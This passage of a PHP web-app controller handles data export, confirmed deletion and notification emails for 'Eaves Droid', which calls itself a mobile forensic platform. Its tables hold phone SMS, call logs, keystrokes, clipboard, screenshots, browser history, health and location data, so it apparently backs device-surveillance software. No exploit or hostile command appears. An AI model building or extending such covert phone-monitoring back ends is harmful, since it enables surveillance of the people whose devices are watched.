        } elseif ($type === 'misc_software' || $type === 'misc_hardware') {
            foreach ($data as $section => $sectionData) {
                fputcsv($csv, ["=== $section ==="]);
                if (!is_array($sectionData) || empty($sectionData)) continue;
                if (isset($sectionData[0]) && is_array($sectionData[0])) {
                    fputcsv($csv, array_keys($sectionData[0]));
                    foreach ($sectionData as $row) {
                        fputcsv($csv, $row);
                    }
                }
            }
        } elseif ($type === 'advanced') {
            foreach ($data as $section => $sectionData) {
                fputcsv($csv, ["=== $section ==="]);
                if (empty($sectionData)) continue;
                fputcsv($csv, array_keys($sectionData[0]));
                foreach ($sectionData as $row) {
                    fputcsv($csv, $row);
                }
            }
        }

        rewind($csv);
        $content = stream_get_contents($csv);
        fclose($csv);

        return $this->response
            ->setContentType('text/csv; charset=utf-8')
            ->setHeader('Content-Disposition', 'attachment; filename="' . $filename . '"')
            ->setBody($content);
    }

    /**
     * Deletes user data by type.
     *
     * @param string $type
     * @return mixed
     */
    public function deleteData($type)
    {
        if (!auth()->loggedIn()) {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'Not authenticated']);
            }
            return redirect()->to('login');
        }

        // Show confirmation view for GET requests (non-AJAX)
        if ($this->request->getMethod() !== 'post') {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'POST required']);
            }
            $viewData = [
                'pag' => 'account_profile',
                'user_info' => $this->userData,
                'delete_type' => $type,
                'csrf_token' => csrf_hash(),
            ];
            $viewData = array_merge($viewData, $this->getUserDataCounts());
            return $this->renderView('confirm_delete', $viewData);
        }

        // For AJAX requests, validate via JSON payload
        if ($this->request->isAJAX()) {
            $csrf = $this->request->getPost('csrf_token') ?? $this->request->getHeaderLine('X-CSRF-TOKEN');
            $confirmation = $this->request->getPost('confirmation');
        } else {
            $csrf = $this->request->getPost('csrf_token');
            $confirmation = $this->request->getPost('confirmation');
        }

        if ($confirmation !== 'DELETE') {
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'You must type "DELETE" to confirm']);
            }
            session()->setFlashdata('error', 'You must type "DELETE" to confirm');
            return redirect()->to('account/deleteData/' . $type);
        }

        try {
            $success = false;
            $message = '';
            $deletedCount = 0;

            switch ($type) {
                case 'apps':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_installed_apps', $this->userId);
                    $success = $this->finderModel->deleteAppsByUser($this->userId);
                    $message = 'All apps deleted successfully';
                    break;
                case 'calls':
                case 'call_logs':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_call_logs', $this->userId);
                    $success = $this->finderModel->deleteCallsByUser($this->userId);
                    $message = 'All call logs deleted successfully';
                    break;
                case 'contacts':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_contacts', $this->userId);
                    $success = $this->finderModel->deleteContactsByUser($this->userId);
                    $message = 'All contacts deleted successfully';
                    break;
                case 'sms':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_sms', $this->userId);
                    $success = $this->finderModel->deleteSmsByUser($this->userId);
                    $message = 'All SMS messages deleted successfully';
                    break;
                case 'files':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_device_files', $this->userId);
                    $success = $this->finderModel->deleteDeviceFilesByUser($this->userId);
                    $message = 'All file metadata deleted successfully';
                    break;
                case 'locations':
                    $deletedCount = $this->finderModel->cq('tbl_extracted_locations', $this->userId) + $this->finderModel->cq('tbl_extracted_activities', $this->userId);
                    $success = $this->finderModel->deleteLocationByUser($this->userId) && $this->finderModel->deleteActivityByUser($this->userId);
                    $message = 'All location and activity history deleted successfully';
                    break;
                case 'misc_software':
                    $deletedCount = $this->finderModel->cq('tbl_device_hardware_contexts', $this->userId) + $this->finderModel->cq('tbl_system_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_extracted_calendar_events', $this->userId) + $this->finderModel->cq('tbl_system_app_usage', $this->userId) + $this->finderModel->cq('tbl_extracted_notifications', $this->userId) + $this->finderModel->cq('tbl_system_accessibility_services', $this->userId) + $this->finderModel->cq('tbl_system_input_methods', $this->userId) + $this->finderModel->cq('tbl_security_audit', $this->userId) + $this->finderModel->cq('tbl_system_running_processes', $this->userId) + $this->finderModel->cq('tbl_data_usage', $this->userId) + $this->finderModel->cq('tbl_telemetry_wifi_networks', $this->userId) + $this->finderModel->cq('tbl_system_default_apps_device', $this->userId) + $this->finderModel->cq('tbl_system_alarms', $this->userId) + $this->finderModel->cq('tbl_system_app_security', $this->userId) + $this->finderModel->cq('tbl_network_security', $this->userId) + $this->finderModel->cq('tbl_telephony_network', $this->userId) + $this->finderModel->cq('tbl_system_locale', $this->userId) + $this->finderModel->cq('tbl_system_app_permissions', $this->userId) + $this->finderModel->cq('tbl_extracted_browser_history', $this->userId) + $this->finderModel->cq('tbl_extracted_clipboard_entries', $this->userId) + $this->finderModel->cq('tbl_content_providers', $this->userId) + $this->finderModel->cq('tbl_system_crash_logs', $this->userId) + $this->finderModel->cq('tbl_system_digital_wellbeing', $this->userId) + $this->finderModel->cq('tbl_system_doze_standby', $this->userId) + $this->finderModel->cq('tbl_extracted_email_accounts', $this->userId) + $this->finderModel->cq('tbl_health_data', $this->userId) + $this->finderModel->cq('tbl_keyboard_input', $this->userId) + $this->finderModel->cq('tbl_system_keyguard_events', $this->userId) + $this->finderModel->cq('tbl_extracted_screenshots', $this->userId) + $this->finderModel->cq('tbl_screen_state', $this->userId) + $this->finderModel->cq('tbl_vpn_config', $this->userId) + $this->finderModel->cq('tbl_system_running_processes_detailed', $this->userId);
                    $success = $this->finderModel->deleteDeviceContextByUser($this->userId) &&
                               $this->finderModel->deleteNetworkInfoByUser($this->userId) &&
                               $this->finderModel->deleteAccountsByUser($this->userId) &&
                               $this->finderModel->deleteCalendarByUser($this->userId) &&
                               $this->finderModel->deleteAppUsageByUser($this->userId) &&
                               $this->finderModel->deleteNotificationsByUser($this->userId) &&
                               $this->finderModel->deleteAccessibilityByUser($this->userId) &&
                               $this->finderModel->deleteInputMethodsByUser($this->userId) &&
                               $this->finderModel->deleteSecurityAuditByUser($this->userId) &&
                               $this->finderModel->deleteProcInfoByUser($this->userId) &&
                               $this->finderModel->deleteDataUsageByUser($this->userId) &&
                               $this->finderModel->deleteSavedWifiByUser($this->userId) &&
                               $this->finderModel->deleteDefaultAppsByUser($this->userId) &&
                               $this->finderModel->deleteAlarmsByUser($this->userId) &&
                               $this->finderModel->deleteAppSecurityByUser($this->userId) &&
                               $this->finderModel->deleteNetworkSecurityByUser($this->userId) &&
                               $this->finderModel->deleteTelephonyNetworkByUser($this->userId) &&
                               $this->finderModel->deleteSystemLocaleByUser($this->userId) &&
                               $this->finderModel->deleteAppPermissionsByUser($this->userId) &&
                               $this->finderModel->deleteBrowserHistoryByUser($this->userId) &&
                               $this->finderModel->deleteClipboardByUser($this->userId) &&
                               $this->finderModel->deleteContentProvidersByUser($this->userId) &&
                               $this->finderModel->deleteCrashLogsByUser($this->userId) &&
                               $this->finderModel->deleteDigitalWellbeingByUser($this->userId) &&
                               $this->finderModel->deleteDozeStandbyByUser($this->userId) &&
                               $this->finderModel->deleteEmailAccountsByUser($this->userId) &&
                               $this->finderModel->deleteHealthDataByUser($this->userId) &&
                               $this->finderModel->deleteKeyboardInputByUser($this->userId) &&
                               $this->finderModel->deleteKeyguardEventsByUser($this->userId) &&
                               $this->finderModel->deleteScreenshotsByUser($this->userId) &&
                               $this->finderModel->deleteScreenStateByUser($this->userId) &&
                               $this->finderModel->deleteVpnConfigByUser($this->userId) &&
                               $this->finderModel->deleteRunningProcessesDetailedByUser($this->userId);
                    $message = 'All misc software data deleted successfully';
                    break;
                case 'misc_hardware':
                    $deletedCount = $this->finderModel->cq('tbl_hardware_graphics', $this->userId) + $this->finderModel->cq('tbl_hardware_network', $this->userId) + $this->finderModel->cq('tbl_telemetry_cameras', $this->userId) + $this->finderModel->cq('tbl_telemetry_battery_stats', $this->userId) + $this->finderModel->cq('tbl_telemetry_sensors', $this->userId) + $this->finderModel->cq('tbl_telemetry_bluetooth_devices', $this->userId) + $this->finderModel->cq('tbl_telemetry_cell_towers', $this->userId) + $this->finderModel->cq('tbl_telemetry_display_info', $this->userId) + $this->finderModel->cq('tbl_telemetry_storage_stats', $this->userId) + $this->finderModel->cq('tbl_telemetry_thermal', $this->userId) + $this->finderModel->cq('tbl_telemetry_nfc', $this->userId) + $this->finderModel->cq('tbl_running_processes', $this->userId) + $this->finderModel->cq('tbl_telemetry_audio_devices', $this->userId) + $this->finderModel->cq('tbl_biometric', $this->userId) + $this->finderModel->cq('tbl_telemetry_gnss_hardware', $this->userId) + $this->finderModel->cq('tbl_telemetry_power_rails', $this->userId) + $this->finderModel->cq('tbl_telemetry_usb_devices', $this->userId) + $this->finderModel->cq('tbl_telemetry_vibration', $this->userId);
                    $success = $this->finderModel->deleteHardwareGraphicsByUser($this->userId) &&
                               $this->finderModel->deleteHardwareNetworkByUser($this->userId) &&
                               $this->finderModel->deleteCameraInfoByUser($this->userId) &&
                               $this->finderModel->deleteBatteryStatsByUser($this->userId) &&
                               $this->finderModel->deleteSensorsByUser($this->userId) &&
                               $this->finderModel->deleteBluetoothByUser($this->userId) &&
                               $this->finderModel->deleteCellTowersByUser($this->userId) &&
                               $this->finderModel->deleteDisplayInfoByUser($this->userId) &&
                               $this->finderModel->deleteStorageByUser($this->userId) &&
                               $this->finderModel->deleteThermalByUser($this->userId) &&
                               $this->finderModel->deleteNfcByUser($this->userId) &&
                               $this->finderModel->deleteProcessesByUser($this->userId) &&
                               $this->finderModel->deleteAudioDevicesByUser($this->userId) &&
                               $this->finderModel->deleteBiometricByUser($this->userId) &&
                               $this->finderModel->deleteGnssHardwareByUser($this->userId) &&
                               $this->finderModel->deletePowerRailsByUser($this->userId) &&
                               $this->finderModel->deleteUsbDevicesByUser($this->userId) &&
                               $this->finderModel->deleteVibrationByUser($this->userId);
                    $message = 'All misc hardware data deleted successfully';
                    break;
                case 'advanced':
                    $deletedCount = $this->finderModel->cq('tbl_device_hardware_contexts', $this->userId) + $this->finderModel->cq('tbl_system_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_extracted_calendar_events', $this->userId) + $this->finderModel->cq('tbl_system_app_usage', $this->userId) + $this->finderModel->cq('tbl_extracted_notifications', $this->userId) + $this->finderModel->cq('tbl_telemetry_bluetooth_devices', $this->userId) + $this->finderModel->cq('tbl_telemetry_sensors', $this->userId) + $this->finderModel->cq('tbl_system_accessibility_services', $this->userId) + $this->finderModel->cq('tbl_system_input_methods', $this->userId);
                    $success = $this->finderModel->deleteDeviceContextByUser($this->userId) &&
                               $this->finderModel->deleteNetworkInfoByUser($this->userId) &&
                               $this->finderModel->deleteAccountsByUser($this->userId) &&
                               $this->finderModel->deleteCalendarByUser($this->userId) &&
                               $this->finderModel->deleteAppUsageByUser($this->userId) &&
                               $this->finderModel->deleteNotificationsByUser($this->userId) &&
                               $this->finderModel->deleteBluetoothByUser($this->userId) &&
                               $this->finderModel->deleteSensorsByUser($this->userId) &&
                               $this->finderModel->deleteAccessibilityByUser($this->userId) &&
                               $this->finderModel->deleteInputMethodsByUser($this->userId);
                    $message = 'All advanced extracted data deleted successfully';
                    break;
                case 'all':
                    $result = $this->finderModel->deleteAllUserData($this->userId);
                    $deletedCount = $result['total_deleted'] ?? 0;
                    $success = $result['success'] ?? false;
                    $message = 'All your data has been completely wiped successfully';
                    break;
                default:
                    if ($this->request->isAJAX()) {
                        return $this->response->setJSON(['success' => false, 'message' => 'Invalid delete type']);
                    }
                    session()->setFlashdata('error', 'Invalid delete type');
                    return redirect()->to('account/home');
            }

            $typeLabels = [
                'apps' => 'Applications',
                'calls' => 'Call Logs',
                'call_logs' => 'Call Logs',
                'contacts' => 'Contacts',
                'sms' => 'SMS Messages',
                'files' => 'File Metadata',
                'locations' => 'LocationController History & Activities',
                'advanced' => 'AdvancedController Device Data',
                'all' => 'All Data (Complete Wipe)',
            ];
            $deleteLabel = $typeLabels[$type] ?? ucfirst(str_replace('_', ' ', $type));

            if ($success) {
                $this->logUserAction('deleted_' . str_replace('-', '_', $type), 'system', 'high', 1,
                    ['new_values' => json_encode(['records_type' => $deleteLabel, 'action' => 'delete', 'records_deleted' => $deletedCount])]
                );
                $this->updateLastDeletedTimestamp();

                // Send email notification
                $userEmail = $this->userData['email'] ?? '';
                if ($userEmail) {
                    $deleteBreakdown = '';
                    if ($type === 'misc_software') {
                        $subCounts = [
                            'fa-user' => ['Accounts', $this->finderModel->cq('tbl_accounts', $this->userId)],
                            'fa-calendar-alt' => ['Calendar', $this->finderModel->cq('tbl_extracted_calendar_events', $this->userId)],
                            'fa-chart-bar' => ['App Usage', $this->finderModel->cq('tbl_system_app_usage', $this->userId)],
                            'fa-bell' => ['Notifications', $this->finderModel->cq('tbl_extracted_notifications', $this->userId)],
                            'fa-info-circle' => ['Device Context', $this->finderModel->cq('tbl_device_hardware_contexts', $this->userId)],
                            'fa-network-wired' => ['Network Info', $this->finderModel->cq('tbl_system_network_info', $this->userId)],
                            'fa-universal-access' => ['Accessibility', $this->finderModel->cq('tbl_system_accessibility_services', $this->userId)],
                            'fa-keyboard' => ['Input Methods', $this->finderModel->cq('tbl_system_input_methods', $this->userId)],
                            'fa-shield-alt' => ['Security Audit', $this->finderModel->cq('tbl_security_audit', $this->userId)],
                            'fa-microchip' => ['Proc Info', $this->finderModel->cq('tbl_system_running_processes', $this->userId)],
                            'fa-chart-line' => ['Data Usage', $this->finderModel->cq('tbl_data_usage', $this->userId)],
                            'fa-wifi' => ['Saved WiFi', $this->finderModel->cq('tbl_telemetry_wifi_networks', $this->userId)],
                            'fa-th-list' => ['Default Apps', $this->finderModel->cq('tbl_system_default_apps_device', $this->userId)],
                            'fa-clock' => ['Alarms', $this->finderModel->cq('tbl_system_alarms', $this->userId)],
                            'fa-lock' => ['App Security', $this->finderModel->cq('tbl_system_app_security', $this->userId)],
                            'fa-shield-virus' => ['Network Security', $this->finderModel->cq('tbl_network_security', $this->userId)],
                            'fa-sim-card' => ['Telephony Network', $this->finderModel->cq('tbl_telephony_network', $this->userId)],
                            'fa-language' => ['System Locale', $this->finderModel->cq('tbl_system_locale', $this->userId)],
                        ];
                        $deleteBreakdown = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Deleted Records Breakdown</h4>
                        <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                        foreach ($subCounts as $icon => $info) {
                            $deleteBreakdown .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($info[1]) . ' records</td></tr>';
                        }
                        $deleteBreakdown .= '</table>';
                    } elseif ($type === 'misc_hardware') {
                        $subCounts = [
                            'fa-palette' => ['Hardware Graphics', $this->finderModel->cq('tbl_hardware_graphics', $this->userId)],
                            'fa-network-wired' => ['Hardware Network', $this->finderModel->cq('tbl_hardware_network', $this->userId)],
                            'fa-camera' => ['Camera Info', $this->finderModel->cq('tbl_telemetry_cameras', $this->userId)],
                            'fa-battery-full' => ['Battery Stats', $this->finderModel->cq('tbl_telemetry_battery_stats', $this->userId)],
                            'fa-ruler' => ['Sensors', $this->finderModel->cq('tbl_telemetry_sensors', $this->userId)],
                            'fa-bluetooth-b' => ['Bluetooth', $this->finderModel->cq('tbl_telemetry_bluetooth_devices', $this->userId)],
                            'fa-broadcast-tower' => ['Cell Towers', $this->finderModel->cq('tbl_telemetry_cell_towers', $this->userId)],
                            'fa-tv' => ['Display Info', $this->finderModel->cq('tbl_telemetry_display_info', $this->userId)],
                            'fa-hdd' => ['Storage', $this->finderModel->cq('tbl_telemetry_storage_stats', $this->userId)],
                            'fa-thermometer-half' => ['Thermal', $this->finderModel->cq('tbl_telemetry_thermal', $this->userId)],
                            'fa-credit-card' => ['NFC', $this->finderModel->cq('tbl_telemetry_nfc', $this->userId)],
                            'fa-tasks' => ['Processes', $this->finderModel->cq('tbl_running_processes', $this->userId)],
                        ];
                        $deleteBreakdown = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Deleted Records Breakdown</h4>
                        <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
                        foreach ($subCounts as $icon => $info) {
                            $deleteBreakdown .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($info[1]) . ' records</td></tr>';
                        }
                        $deleteBreakdown .= '</table>';
                    }

                    $deleteBody = '
<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
<div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
<div style="background:#dc3545;padding:20px;text-align:center;"><h1 style="color:#fff;margin:0;font-size:22px;">🗑️ Data Deleted</h1></div>
<div style="padding:25px;">
<p style="color:#333;font-size:15px;">Hello,</p>
<p style="color:#333;font-size:15px;">The following data has been permanently deleted from your <strong>Eaves Droid</strong> account.</p>
<table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Action</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">Permanent Deletion</td></tr>
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $deleteLabel . '</td></tr>
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Records Deleted</td><td style="padding:10px 15px;">' . number_format($deletedCount) . '</td></tr>
<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Severity</td><td style="padding:10px 15px;"><span style="color:#dc3545;font-weight:bold;">HIGH</span></td></tr>
<tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Completed</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
</table>' . $deleteBreakdown . '
<div style="background:#fce8e8;border-left:4px solid #dc3545;padding:12px 15px;margin:15px 0;border-radius:4px;">
<p style="margin:0;color:#333;font-size:13px;"><strong>⚠️ This action cannot be undone.</strong> The deleted data has been permanently removed from the server.</p>
</div>
<p style="color:#333;font-size:15px;">If you did not perform this action, please contact support immediately.</p>
<p style="color:#333;font-size:15px;">Thank you,<br><strong>Eaves Droid Team</strong></p>
<div style="margin-top:20px;padding:12px 15px;background:#e9ecef;border-radius:6px;font-size:11px;color:#555;">
<table style="width:100%;border-collapse:collapse;">
<tr><td style="padding:2px 5px;"><strong>Action:</strong> Data Deletion</td></tr>
<tr><td style="padding:2px 5px;"><strong>Status:</strong> <span style="color:#dc3545;font-weight:bold;">Completed</span></td></tr>
<tr><td style="padding:2px 5px;"><strong>Browser:</strong> ' . htmlspecialchars($this->request->getUserAgent()->getAgentString() ?: '') . '</td></tr>
<tr><td style="padding:2px 5px;"><strong>Browser IP:</strong> ' . $this->request->getIPAddress() . '</td></tr>
<tr><td style="padding:2px 5px;"><strong>Executed At:</strong> ' . date('Y-m-d H:i:s') . '</td></tr>
</table>
</div>
</div>
<div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">Eaves Droid — AdvancedController Mobile Forensic &amp; Data Intelligence Platform</div>
</div></body></html>';

                    $this->sendNotificationEmail(
                        $userEmail,
                        'Eaves Droid — Data Deleted: ' . $deleteLabel,
                        $deleteBody
                    );
                }

                if ($this->request->isAJAX()) {
                    return $this->response->setJSON(['success' => true, 'message' => $message]);
                }
                session()->setFlashdata('success', $message);
            } else {
                if ($this->request->isAJAX()) {
                    return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete data']);
                }
                session()->setFlashdata('error', 'Failed to delete data');
            }

            return redirect()->to('account/home');

        } catch (\Exception $e) {
            log_message('error', 'Delete data error: ' . $e->getMessage());
            if ($this->request->isAJAX()) {
                return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete data: ' . $e->getMessage()]);
            }
            session()->setFlashdata('error', 'Failed to delete data: ' . $e->getMessage());
            return redirect()->to('account/home');
        }
    }

    /**
     * Estimates the size of a data array for email notifications.
     */
    private function estimateDataSize(array $data): string
    {
        $json = @json_encode($data);
        $bytes = $json ? strlen($json) : 0;
        if ($bytes > 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes > 1024) {
            return number_format($bytes / 1024, 1) . ' KB';
        }
        return number_format($bytes) . ' B';
    }

    /**
     * Sends a notification email via configured SMTP.
     */
    private function sendNotificationEmail(string $to, string $subject, string $htmlBody): bool
    {
        try {
            $db = \Config\Database::connect();
            $smtp = [];
            $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
            foreach ($rows as $r) {
                $smtp[$r['key']] = $r['value'];
            }
            if (empty($smtp['smtp_host'])) return false;

            $email = \Config\Services::email();
            $email->initialize([
                'protocol'   => 'smtp',
                'SMTPHost'   => $smtp['smtp_host'],
                'SMTPPort'   => $smtp['smtp_port'] ?? '587',
                'SMTPUser'   => $smtp['smtp_user'] ?? '',
                'SMTPPass'   => $smtp['smtp_pass'] ?? '',
                'SMTPCrypto' => 'tls',
                'mailType'   => 'html',
            ]);
            $email->setFrom($smtp['smtp_from_email'] ?? '', $smtp['smtp_from_name'] ?? 'Eaves Droid');
            $email->setTo($to);
            $email->setSubject($subject);
            $email->setMessage($htmlBody);
            return $email->send();
        } catch (\Exception $e) {
            log_message('error', 'Notification email failed: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Updates export count in user profile.
     *
     * @return bool
     */
    private function updateExportCount(): bool
    {
        try {
            $db = \Config\Database::connect();
            $builder = $db->table('user_profiles');

            $exists = $builder->where('user_id', $this->userId)->countAllResults() > 0;

            if ($exists) {
                $builder->where('user_id', $this->userId)
                    ->set('export_count', 'export_count + 1', false)
                    ->set('last_exported_at', date('Y-m-d H:i:s'))
                    ->set('updated_at', date('Y-m-d H:i:s'))
                    ->update();
            } else {
                $builder->insert([
                    'user_id' => $this->userId,
                    'export_count' => 1,
                    'last_exported_at' => date('Y-m-d H:i:s'),
                    'created_at' => date('Y-m-d H:i:s'),
                    'updated_at' => date('Y-m-d H:i:s')
                ]);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'Update export count failed: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Updates last deleted timestamp.
     *
     * @return bool
     */
    private function updateLastDeletedTimestamp(): bool
    {
        try {
            $db = \Config\Database::connect();
            $builder = $db->table('user_profiles');

            $exists = $builder->where('user_id', $this->userId)->countAllResults() > 0;

            if ($exists) {
                $builder->where('user_id', $this->userId)
                    ->set('last_deleted_data_at', date('Y-m-d H:i:s'))
                    ->set('updated_at', date('Y-m-d H:i:s'))
                    ->update();
            } else {
                $builder->insert([
                    'user_id' => $this->userId,
                    'last_deleted_data_at' => date('Y-m-d H:i:s'),
                    'created_at' => date('Y-m-d H:i:s'),
                    'updated_at' => date('Y-m-d H:i:s')
                ]);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'Update last deleted timestamp failed: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Gets authenticated user data from Shield.
     *
     * @return array
     */
    private function getAuthenticatedUserData(): array
    {
        $user = auth()->user();

        if (!$user) {
            return [];
        }

        $userArray = $user->toArray();
        $userArray['email'] = $user->getEmail();
        $userArray['id'] = $user->id;

        // Get profile data for avatar
        if ($this->userId || $user->id) {
            $profile = (new UserModel())->get_data_tbl_users($this->userId ?? $user->id);
            if ($profile) {
                $userArray['profile_image'] = $profile['profile_image'] ?? null;
            }
        }

        return $userArray;
    }

    /**
     * LogsController user actions.
     *
     * @param string $actionType
     * @param string $category
     * @param string $severity
     * @param int $success
     * @param array $additionalData
     * @return bool
     */
    private function logUserAction(
        string $actionType,
        string $category = 'system',
        string $severity = 'low',
        int $success = 1,
        array $additionalData = []
    ): bool {
        try {
            $logData = [
                'user_id' => $this->userId,
                'action_type' => $actionType,
                'action_category' => $category,
                'action_severity' => $severity,
                'ip_address' => $this->request->getIPAddress(),
                'user_agent' => $this->request->getUserAgent()->getAgentString(),
                'request_url' => current_url(),
                'device_type' => 'web',
                'success' => $success,
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
                'created_at' => date('Y-m-d H:i:s')
            ];

            if (!empty($additionalData)) {
                $logData = array_merge($logData, $additionalData);
            }

            return $this->modAccessLogs->logAction($logData) !== false;
        } catch (\Exception $e) {
            log_message('error', 'Failed to log user action: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Renders view with common layout.
     *
     * @param string $page
     * @param array $data
     * @return string
     */
    private function renderView(string $page, array $data = []): string
    {
        // Start output buffering
        ob_start();

        try {
            // Load helper
            helper('logs');

            // Merge device view data for sidebar
            $data = array_merge($data, $this->getDeviceViewData());

            // Set the view path
            $viewPath = 'users/account/' . $page;

            // Load header
            echo view('headers_footers/head_users', $data);

            // Load sidebar
            echo view('headers_footers/sidebar_users', $data);

            // Load main content
            echo view($viewPath, $data);

            // Load footer based on page type
            if (in_array($page, ['access_logs', 'stats', 'devices', 'sessions'])) {
                echo view('headers_footers/footer_data_datatables', $data);
            } else {
                echo view('headers_footers/footer_users', $data);
            }

            return ob_get_clean();

        } catch (\Exception $e) {
            ob_end_clean();
            log_message('error', "View rendering error for {$page}: " . $e->getMessage());
            throw new \RuntimeException("Failed to render view: {$page}");
        }
    }
}
